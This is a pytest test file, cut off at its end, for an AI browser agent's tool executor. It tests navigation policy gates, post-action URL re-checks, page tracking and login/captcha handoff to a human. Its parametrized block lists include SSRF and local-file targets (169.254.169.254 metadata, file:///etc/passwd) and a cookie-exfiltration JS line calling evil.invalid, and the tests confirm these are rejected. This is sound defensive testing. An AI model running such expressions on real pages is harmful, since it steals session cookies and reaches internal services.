"""T4 接线单测：AppToolExecutor 的 6 个 Tier3 浏览器工具。

覆盖主线：**policy 门**（navigate 之前把关、拒绝路径绝不建页/导航）、**动作后 URL 复查**
（重定向/点击跳转/JS 跳转回流后的落点也要在策略内，I2）、**当前页跟踪**（open 复用同一个 page；
snapshot/click/type/scroll 都作用在它身上；池回收后的恢复与 ``aclose()`` 释放，I3）、
**结构化降级**（未注入池 / 池未启动 / 快照为空 / 动作失败 一律返回 ToolResult，绝不抛）、
**D5/D6 HITL 桥**（open/click/type 之后采样页面，命中登录/验证码即挂
``needs_human`` + ``human_prompt`` + ``intervention``；检测失败绝不影响动作结果）。

不启真实浏览器（教训 §1）：FakeBrowser / FakePage 双人舞——page 的 ``calls`` 保留跨方法
的时间顺序（用来 pin "先 aria-ref 定位再 click"、"type 先清空再填"），失败可编程
（goto / networkidle 等待 / snapshot / click / JS 回退 / evaluate / **content / 密码框探测**），
跳转可编程（``redirect_url`` / ``click_url`` / ``evaluate_url``，动作后复查的测试缝），
``html`` / ``password_inputs`` 是登录/验证码检测的测试缝，``closed`` 可以模拟池回收；
FakeBrowser 实现 executor 用到的 ``new_page()`` / ``release()``，
并记录建页次数与归还（当前页复用、隔离、释放的证据）。
真浏览器冒烟是 T6 的独立脚本，不入 pytest。
"""

from __future__ import annotations

import asyncio
import json
from typing import Any

import pytest
from playwright.async_api import TimeoutError as PlaywrightTimeoutError

from browsepilot.agent.tools import ToolExecutor
from browsepilot.app.browser.detect import MAX_HTML_SAMPLE_CHARS
from browsepilot.app.browser.policy import NavigationPolicy
from browsepilot.app.executor import MAX_JS_RESULT_CHARS, AppToolExecutor
from browsepilot.app.services.weather import Weather

BROWSER_TOOLS = [
    "browser_open",
    "browser_snapshot",
    "browser_click",
    "browser_type",
    "browser_scroll",
    "browser_execute_js",
]

# Playwright 1.59 ai 模式实况（见 test_browser_snapshot.py）：[ref=eN] 只在 mode="ai" 下产生。
ARIA_YAML = """- generic [ref=e1]:
  - heading "Example Domain" [level=1] [ref=e2]
  - link "More information..." [ref=e4]
"""

DEFAULT_HTML = "<html><body><h1>Example Domain</h1><p>This domain is for use in examples.</p></body></html>"
"""默认采样 HTML：普通页面，不含任何登录/验证码/弹窗标记（D5/D6 的负对照）。"""

LOGIN_HTML = (
    "<html><body><form>账号 <input name='user'>密码 <input type='password'>"
    "<button>登录</button></form></body></html>"
)
"""登录页采样：中文入口词 + 凭据词 + 密码框（真实登录页的最小形态）。"""

CAPTCHA_HTML = "<html><body><p>请完成人机验证：点击验证后继续</p></body></html>"


# ── fake page / browser（executor 的测试缝） ──────────────────────────────────


class FakeResponse:
    def __init__(self, status: int = 200) -> None:
        self.status = status


class FakeLocator:
    def __init__(self, page: FakePage, selector: str) -> None:
        self._page = page
        self.selector = selector

    async def aria_snapshot(self, *, mode: str = "ai") -> str:
        self._page.calls.append(("aria_snapshot", self.selector, mode))
        if self._page.fail_snapshot:
            raise RuntimeError("aria snapshot unavailable")
        return self._page.snapshot_tree

    async def click(self, *, timeout: float | None = None) -> None:
        self._page.calls.append(("click", self.selector))
        if self._page.click_url is not None:  # 点链接/弹窗跳转（动作后 URL 复查的测试缝）
            self._page.url = self._page.click_url
        if self._page.fail_click:
            raise PlaywrightTimeoutError(f"click timeout: {self.selector}")

    async def fill(self, value: str, *, timeout: float | None = None) -> None:
        self._page.calls.append(("fill", self.selector, value))

    async def evaluate(self, expression: Any, arg: Any = None, *, timeout: float | None = None):
        self._page.calls.append(("locator_evaluate", self.selector, expression))
        if self._page.fail_locator_evaluate:
            raise PlaywrightTimeoutError(f"js fallback timeout: {self.selector}")
        return True

    async def count(self) -> int:
        """D5/D6 密码框探测：只有密码选择器才返回计数（别的选择器动作层从不 count）。"""
        self._page.calls.append(("count", self.selector))
        if self._page.fail_password_count:
            raise RuntimeError(f"count unavailable: {self.selector}")
        return self._page.password_inputs if "password" in self.selector else 0

    async def scroll_into_view_if_needed(self, *, timeout: float | None = None) -> None:
        self._page.calls.append(("scroll_into_view", self.selector))


class FakeMouse:
    def __init__(self, page: FakePage) -> None:
        self._page = page

    async def wheel(self, delta_x: float, delta_y: float) -> None:
        self._page.calls.append(("wheel", delta_x, delta_y))


class FakePage:
    """记录调用序、可编程失败的假 page（只实现 executor/actions 真正用到的方法）。"""

    def __init__(
        self,
        *,
        url: str = "https://example.com/",
        snapshot_tree: str = ARIA_YAML,
        js_result: Any = "Example Domain",
        html: str = DEFAULT_HTML,
        password_inputs: int = 0,
    ) -> None:
        self.url = url
        self.snapshot_tree = snapshot_tree
        self.js_result = js_result
        self.html = html  # D5/D6：page.content() 的采样
        self.password_inputs = password_inputs  # D5/D6：input[type=password] 的匹配数
        self.calls: list[tuple] = []
        self.goto_calls: list[str] = []
        self.closed = False  # 池回收（dispose → close）后为 True
        self.redirect_url: str | None = None  # goto 跟随重定向后的最终 URL
        self.click_url: str | None = None  # 点击链接/弹窗后的 URL
        self.evaluate_url: str | None = None  # JS 跳转后的 URL
        self.fail_goto = False
        self.fail_networkidle_wait = False
        self.fail_snapshot = False
        self.fail_click = False
        self.fail_locator_evaluate = False
        self.fail_evaluate = False
        self.fail_content = False  # D5/D6：采样失败必须降级成“没发现”
        self.fail_password_count = False
        self.mouse = FakeMouse(self)

    async def goto(self, url: str, *, wait_until: str | None = None, timeout: float | None = None):
        self.goto_calls.append(url)
        self.calls.append(("goto", url, wait_until))
        if self.fail_goto:
            raise RuntimeError("net::ERR_NAME_NOT_RESOLVED")
        self.url = self.redirect_url if self.redirect_url is not None else url
        return FakeResponse()

    def is_closed(self) -> bool:
        return self.closed

    async def wait_for_load_state(self, state: str | None = None, *, timeout: float | None = None):
        self.calls.append(("wait_for_load_state", state))
        if self.fail_networkidle_wait:
            raise PlaywrightTimeoutError("networkidle wait bounded out")

    def locator(self, selector: str) -> FakeLocator:
        self.calls.append(("locator", selector))
        return FakeLocator(self, selector)

    def get_by_text(self, text: str, *, exact: bool | None = False) -> FakeLocator:
        self.calls.append(("get_by_text", text, exact))
        return FakeLocator(self, f"text={text}")

    async def evaluate(self, expression: Any):
        self.calls.append(("evaluate", expression))
        if self.fail_evaluate:
            raise RuntimeError("Evaluation failed: ReferenceError")
        if self.evaluate_url is not None:  # JS 跳转（静态黑名单漏网时的兜底测试缝）
            self.url = self.evaluate_url
        return self.js_result

    async def content(self) -> str:
        """D5/D6 页面采样（executor 只取前 20KB 并小写）。"""
        self.calls.append(("content",))
        if self.fail_content:
            raise RuntimeError("page content unavailable")
        return self.html


class FakeBrowser:
    """BrowserPool 替身：只实现 executor 用到的 new_page()/release()；可注入启动失败。"""

    def __init__(self, page: FakePage | None = None, *, start_error: Exception | None = None):
        self._page = page
        self.start_error = start_error
        self.created: list[FakePage] = []
        self.new_page_calls = 0
        self.released: list[FakePage] = []

    async def start(self) -> None:  # pragma: no cover - 池生命周期由 app 接线负责
        pass

    async def close(self) -> None:  # pragma: no cover
        pass

    async def release(self, page: FakePage) -> None:
        self.released.append(page)

    async def new_page(self) -> FakePage:
        self.new_page_calls += 1
        await asyncio.sleep(0)  # 真实建页有 await 点：并发测试需要这个让出点
        if self.start_error is not None:
            raise self.start_error
        if self._page is None or self._page.is_closed():
            self._page = FakePage()  # 池回收后是新建/复用 idle（不会把死页再交出去）
        self.created.append(self._page)
        return self._page


# ── executor 骨架（Tier1/2 服务只是占位：本文件只测 Tier3 接线） ────────────────


class FakeWeather:
    async def get(self, city: str) -> Weather:
        return Weather(city=city, temperature_c=25.0, conditions="晴")


class FakeSearch:
    async def search(self, query: str, max_results: int = 5):
        return []


class FakeFetch:
    async def fetch(self, url: str):
        return None


def make_executor(browser: Any = None, policy: NavigationPolicy | None = None) -> AppToolExecutor:
    return AppToolExecutor(
        FakeWeather(), FakeSearch(), FakeFetch(), browser=browser, policy=policy
    )


# ── 工具清单 / 无池降级 ──────────────────────────────────────────────────────


def test_executor_with_browser_still_implements_protocol():
    assert isinstance(make_executor(FakeBrowser()), ToolExecutor)


@pytest.mark.asyncio
async def test_browser_tools_listed_with_parameters():
    tools = {t.name: t for t in await make_executor(FakeBrowser()).list_tools()}
    assert set(BROWSER_TOOLS) <= set(tools)
    assert tools["browser_open"].parameters == {"url": "string"}
    assert tools["browser_click"].parameters == {"ref": "string"}
    assert tools["browser_type"].parameters == {"ref": "string", "text": "string"}
    assert tools["browser_scroll"].parameters == {"direction": "string"}
    assert tools["browser_execute_js"].parameters == {"expression": "string"}
    assert all(tools[name].description for name in BROWSER_TOOLS)


@pytest.mark.asyncio
async def test_click_and_type_specs_document_the_target_alias():
    """M-a：spec 只广告 ``ref``，而 agent 层（BrowserParams）发的是 ``target``——

    两个名字 executor 都收（:func:`_arg` 宽容别名），但模型需要从 spec 里知道这一点。
    """
    tools = {t.name: t for t in await make_executor(FakeBrowser()).list_tools()}
    assert "target" in tools["browser_click"].description
    assert "target" in tools["browser_type"].description


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("tool", "arguments"),
    [
        ("browser_open", {"url": "https://example.com/"}),
        ("browser_snapshot", {}),
        ("browser_click", {"ref": "e2"}),
        ("browser_type", {"ref": "e2", "text": "x"}),
        ("browser_scroll", {"direction": "down"}),
        ("browser_execute_js", {"expression": "document.title"}),
    ],
)
async def test_browser_tools_without_pool_degrade_structured(tool, arguments):
    """未注入 BrowserPool：6 个工具都必须返回明确的结构化错误（绝不抛异常）。"""
    result = await make_executor().call(tool, arguments)
    assert result.status == "error"
    assert result.error_type == "browser_unavailable"
    assert "浏览器" in result.error_message


# ── policy 门（navigate 前把关） ─────────────────────────────────────────────


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("url", "expected_code"),
    [
        ("file:///etc/passwd", "protocol_blocked"),
        ("javascript:alert(1)", "protocol_blocked"),
        ("http://127.0.0.1:8000/admin", "private_address_blocked"),
        ("http://169.254.169.254/latest/meta-data/", "private_address_blocked"),
        ("http://localhost:5173/", "private_address_blocked"),
        (" https://example.com/", "invalid_url"),
    ],
)
async def test_browser_open_gates_url_before_navigating(url, expected_code):
    """T2 交接：actions.navigate 自身不设防（可开 file://），把关必须在 executor 这一层。"""
    browser = FakeBrowser()
    result = await make_executor(browser).call("browser_open", {"url": url})
    assert result.status == "error"
    assert result.error_type == "navigation_blocked"
    assert expected_code in result.error_message  # policy 的稳定 reason code 直达用户
    assert result.data["reason"].startswith(expected_code)
    assert browser.new_page_calls == 0  # 拒绝路径上不建页、不导航
    assert browser.created == []


@pytest.mark.asyncio
async def test_browser_open_missing_url_is_blocked_by_policy():
    """url 缺失/非字符串同样走 policy 门（单一关口：reason 里带 invalid_url）。"""
    browser = FakeBrowser()
    ex = make_executor(browser)
    for arguments in ({}, {"url": None}, {"url": 123}):
        result = await ex.call("browser_open", arguments)
        assert result.status == "error"
        assert result.error_type == "navigation_blocked"
        assert "invalid_url" in result.error_message
    assert browser.new_page_calls == 0


@pytest.mark.asyncio
async def test_browser_open_uses_injected_allowlist_policy():
    """policy 可注入：allowlist 模式下白名单外的域名被拒、白名单内放行。"""
    browser = FakeBrowser()
    ex = make_executor(browser, policy=NavigationPolicy("allowlist", ["example.com"]))
    blocked = await ex.call("browser_open", {"url": "https://evil.com/"})
    assert blocked.error_type == "navigation_blocked"
    assert "domain_not_allowed" in blocked.error_message
    allowed = await ex.call("browser_open", {"url": "https://www.example.com/start"})
    assert allowed.status == "success"
    assert browser.created[0].goto_calls == ["https://www.example.com/start"]


@pytest.mark.asyncio
async def test_browser_open_policy_defaults_to_settings(monkeypatch):
    """不注入 policy 时由 Settings（BP_ 环境）构造：默认 allow_https 放行公网、挡内网。"""
    monkeypatch.setenv("BP_NAVIGATION_POLICY", "allow_https")
    browser = FakeBrowser()
    ex = make_executor(browser)
    blocked = await ex.call("browser_open", {"url": "http://192.168.1.1/"})
    assert blocked.error_type == "navigation_blocked"
    assert "private_address_blocked" in blocked.error_message
    assert (await ex.call("browser_open", {"url": "https://example.com/"})).status == "success"


# ── 当前页跟踪 ───────────────────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_browser_open_returns_navigation_data():
    browser = FakeBrowser()
    result = await make_executor(browser).call("browser_open", {"url": "https://example.com/page"})
    assert result.status == "success"
    assert result.data["requested_url"] == "https://example.com/page"
    assert result.data["url"] == "https://example.com/page"
    assert result.data["status"] == 200
    assert browser.created[0].goto_calls == ["https://example.com/page"]
    assert "已打开" in result.content


@pytest.mark.asyncio
async def test_browser_open_reuses_the_same_page_across_calls():
    browser = FakeBrowser()
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/a"})
    await ex.call("browser_open", {"url": "https://example.com/b"})
    assert browser.new_page_calls == 1  # 同一个 current page，不额外占池
    assert browser.created[0].goto_calls == ["https://example.com/a", "https://example.com/b"]


@pytest.mark.asyncio
async def test_browser_open_failure_keeps_page_for_later_observation():
    """导航失败也是数据：current page 仍然可用（后续 snapshot 继续观察）。"""
    page = FakePage()
    page.fail_goto = True
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    failed = await ex.call("browser_open", {"url": "https://example.com/down"})
    assert failed.status == "error"
    assert failed.error_type == "navigation_failed"
    assert (await ex.call("browser_snapshot", {})).status == "success"


@pytest.mark.asyncio
async def test_browser_open_tolerates_networkidle_timeout():
    """有界等待超时只说明"页面还没静"，不是失败（T2 的 D3 语义）。"""
    page = FakePage()
    page.fail_networkidle_wait = True
    result = await make_executor(FakeBrowser(page)).call(
        "browser_open", {"url": "https://example.com/slow"}
    )
    assert result.status == "success"
    assert result.data["wait_timeout"] is True


@pytest.mark.asyncio
async def test_browser_pool_not_started_degrades_to_browser_unavailable():
    browser = FakeBrowser(start_error=RuntimeError("BrowserPool.new_page() called before start()"))
    result = await make_executor(browser).call("browser_open", {"url": "https://example.com/"})
    assert result.status == "error"
    assert result.error_type == "browser_unavailable"
    assert "start()" in result.error_message


@pytest.mark.asyncio
async def test_concurrent_opens_share_one_page():
    """并发 open 也不会各建一个 page（检查 current page 与建页之间没有互斥时会）。"""
    browser = FakeBrowser()
    ex = make_executor(browser)
    await asyncio.gather(
        ex.call("browser_open", {"url": "https://example.com/a"}),
        ex.call("browser_open", {"url": "https://example.com/b"}),
    )
    assert browser.new_page_calls == 1
    assert browser.created[0].goto_calls == ["https://example.com/a", "https://example.com/b"]


@pytest.mark.asyncio
async def test_closed_current_page_is_reacquired_on_next_open():
    """I3：池到上限会回收最老的 busy page（dispose → close）——死页不能再当当前页。

    不检查的话 ``self._page`` 永远指向死页：之后每个浏览器调用都失败、无法恢复，
    而且那个池槽也永远不释放。
    """
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/a"})
    page.closed = True  # 池回收
    assert (await ex.call("browser_snapshot", {})).error_type == "no_open_page"
    result = await ex.call("browser_open", {"url": "https://example.com/b"})
    assert result.status == "success"
    assert browser.new_page_calls == 2  # 重新取页（而不是复用死页）
    fresh = browser.created[-1]
    assert fresh is not page
    assert fresh.goto_calls == ["https://example.com/b"]


@pytest.mark.asyncio
async def test_aclose_releases_current_page_back_to_pool():
    """I3：显式释放——不回池的话一个池槽被永久占住（max_pages=3 时三个会话就占满）。"""
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    await ex.aclose()
    assert browser.released == [page]
    assert (await ex.call("browser_snapshot", {})).error_type == "no_open_page"
    await ex.aclose()  # 幂等：没有当前页时不重复归还
    assert browser.released == [page]


@pytest.mark.asyncio
async def test_aclose_does_not_return_a_dead_page_to_the_pool():
    """已关闭的页面不入 idle：``new_page()`` 会原样取出 idle，放死页等于把故障传染给下一个调用者。"""
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    page.closed = True
    await ex.aclose()
    assert browser.released == []


# ── snapshot ────────────────────────────────────────────────────────────────


@pytest.mark.asyncio
async def test_snapshot_without_open_page_is_structured_error():
    browser = FakeBrowser()
    result = await make_executor(browser).call("browser_snapshot", {})
    assert result.status == "error"
    assert result.error_type == "no_open_page"
    assert "browser_open" in result.error_message
    assert browser.new_page_calls == 0  # 不偷偷建页：没有页面就是没有页面


@pytest.mark.asyncio
async def test_snapshot_returns_refs_for_click():
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    page.calls.clear()
    result = await ex.call("browser_snapshot", {})
    assert result.status == "success"
    assert "[ref=e2]" in result.content
    assert result.data["refs"] in result.content  # refs 原样保留（后面 click 要用）
    assert result.data["url"] == "https://example.com/"
    assert ("aria_snapshot", "body", "ai") in page.calls  # mode="ai" 是唯一产出 ref 的模式


@pytest.mark.asyncio
async def test_snapshot_marks_itself_observation_only():
    """M-b：快照是“看见了什么”，不是“做了什么”——答案模型不能由此推断发生过交互。

    答案节点只读 ``result_data``（graph.py 的 answer），所以标注要进 ``data``；
    ``content`` 同步带上，保持两个面一致。
    """
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_snapshot", {})
    assert result.status == "success"
    assert "仅观察" in result.content
    assert "仅观察" in result.data["note"]
    assert "未执行交互" in result.data["note"]


@pytest.mark.asyncio
async def test_snapshot_empty_page_is_failure_so_chain_can_degrade():
    """空快照按失败处理：策略链会继续降级（否则把"什么都没有"当成功汇报）。"""
    page = FakePage(snapshot_tree="")
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_snapshot", {})
    assert result.status == "error"
    assert result.error_type == "empty_snapshot"


@pytest.mark.asyncio
async def test_snapshot_failure_is_structured():
    page = FakePage()
    page.fail_snapshot = True
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_snapshot", {})
    assert result.status == "error"
    assert result.error_type == "snapshot_failed"
    assert "aria snapshot unavailable" in result.error_message


# ── click / type / scroll（委托给 actions，错误原样结构化） ───────────────────


@pytest.mark.asyncio
async def test_click_uses_aria_ref_for_snapshot_labels():
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    page.calls.clear()
    result = await ex.call("browser_click", {"ref": "e2"})
    assert result.status == "success"
    assert ("click", "aria-ref=e2") in page.calls
    assert result.data["resolution"] == {"kind": "ref", "selector": "aria-ref=e2"}
    assert result.data["js_fallback"] is False


@pytest.mark.asyncio
async def test_click_accepts_target_alias_and_non_str_ref():
    """模型可能写 target/CSS/数字 ref：别名与强转都在这一层，actions 负责分级（T2 契约）。"""
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    page.calls.clear()
    text_hit = await ex.call("browser_click", {"target": "More information"})
    assert text_hit.status == "success"
    assert ("get_by_text", "More information", False) in page.calls
    numeric = await ex.call("browser_click", {"ref": 3})
    assert numeric.status == "success"
    assert ("click", "aria-ref=3") in page.calls


@pytest.mark.asyncio
async def test_click_missing_target_is_invalid_not_crash():
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_click", {})
    assert result.status == "error"
    assert result.error_type == "invalid_target"


@pytest.mark.asyncio
async def test_click_falls_back_to_js_and_reports_js_fallback():
    """Playwright 点击超时 → JS 兜底触发；js_fallback=True 意为"已派发，效果未证"。"""
    page = FakePage()
    page.fail_click = True
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_click", {"ref": "e2"})
    assert result.status == "success"
    assert result.data["js_fallback"] is True
    assert any(call[0] == "locator_evaluate" for call in page.calls)


@pytest.mark.asyncio
async def test_click_failure_keeps_attempts_and_errors_from_actions():
    page = FakePage()
    page.fail_click = True
    page.fail_locator_evaluate = True
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_click", {"ref": "e2"})
    assert result.status == "error"
    assert result.error_type == "timeout"
    assert result.data["attempts"] == 3  # 1 + ACTION_RETRIES(2)，ref 单候选
    assert result.data["target"] == "e2"
    assert result.data["errors"]  # 每次尝试的失败原因都保留给降级/诊断


@pytest.mark.asyncio
async def test_type_clears_before_filling_and_requires_text():
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    page.calls.clear()
    filled = await ex.call("browser_type", {"ref": "e2", "text": "蓝牙耳机"})
    assert filled.status == "success"
    assert [call for call in page.calls if call[0] == "fill"] == [
        ("fill", "aria-ref=e2", ""),
        ("fill", "aria-ref=e2", "蓝牙耳机"),
    ]
    missing = await ex.call("browser_type", {"ref": "e2"})
    assert missing.status == "error"
    assert missing.error_type == "invalid_text"


@pytest.mark.asyncio
async def test_scroll_defaults_to_down_and_honours_direction_amount():
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    page.calls.clear()
    default = await ex.call("browser_scroll", {})
    assert default.status == "success"
    assert ("wheel", 0, 500) in page.calls
    assert default.data["direction"] == "down"
    up = await ex.call("browser_scroll", {"direction": "up", "amount": 120})
    assert up.status == "success"
    assert ("wheel", 0, -120) in page.calls
    bad = await ex.call("browser_scroll", {"direction": "斜着"})
    assert bad.status == "error"
    assert bad.error_type == "invalid_direction"


# ── I2：动作后导航复查（点击/JS/重定向绕不过策略门） ──────────────────────────


@pytest.mark.asyncio
async def test_browser_open_revalidates_the_post_redirect_url():
    """goto 会跟随重定向：入参可能合法，最终落点却在策略外（云元数据端点）。"""
    page = FakePage()
    page.redirect_url = "http://169.254.169.254/latest/meta-data/"
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    result = await ex.call("browser_open", {"url": "https://example.com/r"})
    assert result.status == "error"
    assert result.error_type == "navigation_blocked"
    assert "private_address_blocked" in result.error_message
    assert result.data["reason"].startswith("private_address_blocked")
    assert result.data["action"] == "browser_open"
    assert page.goto_calls == ["https://example.com/r"]  # 入参确实过了门（拦的是落点）
    # 违规页被隔离：后续调用不会继续在它上面动作
    assert (await ex.call("browser_snapshot", {})).error_type == "no_open_page"
    assert browser.released == [page]


@pytest.mark.asyncio
async def test_browser_click_navigation_is_revalidated():
    """点击链接/弹窗可以把页面带去任何地方（T2 实证：actions 自身不设防，能开 file://）。"""
    page = FakePage()
    page.click_url = "file:///etc/passwd"
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_click", {"ref": "e2"})
    assert result.status == "error"
    assert result.error_type == "navigation_blocked"
    assert "protocol_blocked" in result.error_message
    assert result.data["action"] == "browser_click"
    assert (await ex.call("browser_snapshot", {})).error_type == "no_open_page"
    assert browser.released == [page]


@pytest.mark.asyncio
async def test_browser_click_same_domain_navigation_still_succeeds():
    """负对照：点击后的同域跳转（合法）照常成功，且不触发隔离。"""
    page = FakePage()
    page.click_url = "https://example.com/next"
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_click", {"ref": "e2"})
    assert result.status == "success"
    assert result.data["url"] == "https://example.com/next"
    assert browser.released == []
    assert (await ex.call("browser_snapshot", {})).status == "success"


@pytest.mark.asyncio
async def test_execute_js_navigation_is_revalidated_when_the_denylist_misses():
    """静态黑名单是 best-effort（不是沙箱）：漏网的表达式真把页面带出去时，动作后复查兜底。"""
    page = FakePage()
    page.evaluate_url = "http://169.254.169.254/latest/meta-data/"
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_execute_js", {"expression": "document.title"})
    assert result.status == "error"
    assert result.error_type == "navigation_blocked"
    assert "private_address_blocked" in result.error_message
    assert result.data["action"] == "browser_execute_js"
    assert (await ex.call("browser_snapshot", {})).error_type == "no_open_page"


# ── execute_js（只读 + 截断） ────────────────────────────────────────────────


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "expression",
    [
        "document.title",
        "document.querySelectorAll('a').length",
        "JSON.stringify({u: location.href, t: document.title})",
        "document.body.innerText",
    ],
)
async def test_execute_js_allows_read_only_extraction(expression):
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_execute_js", {"expression": expression})
    assert result.status == "success"
    assert ("evaluate", expression) in page.calls
    assert result.data["result"] == "Example Domain"


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "expression",
    [
        "fetch('/api/delete')",
        "document.cookie = 'k=v'",
        "document.body.innerHTML = '<b>x</b>'",
        "localStorage.setItem('k', 'v')",
        "location.href = 'https://evil.example/'",
        "window.open('https://evil.example/')",
        "document.querySelector('form').submit()",
        "document.querySelector('button').click()",
        "eval('1+1')",
        "new Function('return 1')()",
        "navigator.clipboard.writeText('x')",
        # I2 评审探针：旧黑名单漏掉的写法
        "location.assign('https://evil.example/')",
        "location.replace('/next')",
        "document.forms[0].requestSubmit()",
        "document.body.textContent='x'",
        "new Image().src='http://evil.invalid/?c='+document.cookie",
        "window['fetch']('/api/delete')",
    ],
)
async def test_execute_js_blocks_write_expressions(expression):
    """D1「execute_js 仅读」落地：写操作静态拒（best-effort 黑名单，见 executor docstring）。"""
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    page.calls.clear()
    result = await ex.call("browser_execute_js", {"expression": expression})
    assert result.status == "error"
    assert result.error_type == "read_only_violation"
    assert not [call for call in page.calls if call[0] == "evaluate"]  # 拒绝路径不执行


@pytest.mark.asyncio
async def test_execute_js_rejects_missing_or_non_str_expression():
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    page.calls.clear()
    for arguments in ({}, {"expression": None}, {"expression": 42}, {"expression": "   "}):
        result = await ex.call("browser_execute_js", arguments)
        assert result.status == "error"
        assert result.error_type == "invalid_expression"
    assert not [call for call in page.calls if call[0] == "evaluate"]


@pytest.mark.asyncio
async def test_execute_js_allows_read_only_string_replace():
    """命名决策：黑名单只拦 ``location.assign/replace``，不连坐字符串的 ``.replace(...)``。

    只读提取里 ``document.body.innerText.replace(...)`` 是常用写法；用“点号开头的
    assign/replace 调用”一刀切会把正常提取也拒了（``arr.join('').replace(…)`` 这类链式调用同理）。
    """
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call(
        "browser_execute_js", {"expression": "document.body.innerText.replace('a', 'b')"}
    )
    assert result.status == "success"


@pytest.mark.asyncio
async def test_execute_js_truncates_before_state():
    page = FakePage(js_result="x" * (MAX_JS_RESULT_CHARS + 50))
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_execute_js", {"expression": "document.body.innerText"})
    assert result.status == "success"
    assert len(result.content) == MAX_JS_RESULT_CHARS
    assert result.data["result"] == result.content
    assert result.data["truncated"] is True


@pytest.mark.asyncio
async def test_execute_js_serialises_non_string_results():
    page = FakePage(js_result={"title": "Example", "links": 3})
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_execute_js", {"expression": "(() => ({title: document.title}))()"})
    assert result.status == "success"
    assert json.loads(result.content) == {"title": "Example", "links": 3}
    assert result.data["truncated"] is False


@pytest.mark.asyncio
async def test_execute_js_failure_is_structured():
    page = FakePage()
    page.fail_evaluate = True
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_execute_js", {"expression": "document.title"})
    assert result.status == "error"
    assert result.error_type == "evaluate_failed"
    assert "ReferenceError" in result.error_message


@pytest.mark.asyncio
async def test_browser_call_with_broken_arguments_never_raises():
    """守护"失败即数据"：即使入参形状超纲（None），也要结构化错误而不是异常冒泡。"""
    page = FakePage()
    browser = FakeBrowser(page)
    ex = make_executor(browser)
    await ex.call("browser_open", {"url": "https://example.com/"})
    result = await ex.call("browser_click", None)  # type: ignore[arg-type]
    assert result.status == "error"
    assert result.error_type == "browser_error"


# ── D5/D6：动作后登录/验证码检测 → HITL 载荷 ─────────────────────────────────


def _hitl_payload(result) -> dict:
    """结果里的 HITL 三兄弟（graph.execute 只读前两个，第三个给 trace/前端）。"""
    return {key: result.data[key] for key in ("needs_human", "human_prompt", "intervention")}


@pytest.mark.asyncio
async def test_browser_open_on_login_page_carries_hitl_payload():
    """D5：动作后落在登录墙 → 挂 needs_human（graph.execute 见它即转 hitl 节点 interrupt）。"""
    page = FakePage(html=LOGIN_HTML, password_inputs=1)
    page.redirect_url = "https://example.com/login"  # 入参合法，站点把页面重定向到登录页
    browser = FakeBrowser(page)
    result = await make_executor(browser).call(
        "browser_open", {"url": "https://example.com/orders"}
    )
    assert result.status == "success"
    assert _hitl_payload(result) == {
        "needs_human": True,
        "human_prompt": "需要人工处理：检测到登录页面，请在浏览器中手动登录后继续任务。",
        "intervention": "login",
    }
    # HITL 载荷是**附加**：动作自己的 data 一个不少
    assert result.data["url"] == "https://example.com/login"
    assert result.data["status"] == 200


@pytest.mark.asyncio
async def test_browser_open_on_normal_page_has_no_needs_human_key():
